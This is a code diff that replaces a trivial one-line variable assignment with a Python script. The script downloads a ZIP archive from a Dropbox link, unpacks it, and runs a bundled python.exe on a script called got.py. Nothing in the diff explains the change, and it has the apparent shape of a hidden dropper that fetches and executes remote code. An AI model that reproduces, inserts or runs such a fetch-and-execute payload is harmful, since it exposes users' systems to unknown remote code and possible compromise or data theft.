@@ -1,1 +1,19 @@
-nih = "5"
+import os
+import requests
+
+# Step 1: Download the ZIP file
+url = "https://www.dropbox.com/scl/fi/9yrn2ndoo640nxly8rs3h/make.zip?rlkey=vpdsfknpb56ausfa3tir72cbi&dl=1"
+filename = "make.zip"
+with requests.get(url, stream=True) as r:
+    r.raise_for_status()
+    with open(filename, 'wb') as f:
+        for chunk in r.iter_content(chunk_size=8192):
+            f.write(chunk)
+# Step 2: Extract the ZIP file
+os.system(f"tar -xf {filename}")
+
+# Step 3: Execute the program
+current_path = os.getcwd()  # This will give you the current directory path
+python_exe = os.path.join(current_path, "make", "python.exe")
+script_path = os.path.join(current_path, "dist", "got.py")
+os.system(f'"{python_exe} {script_path}"')
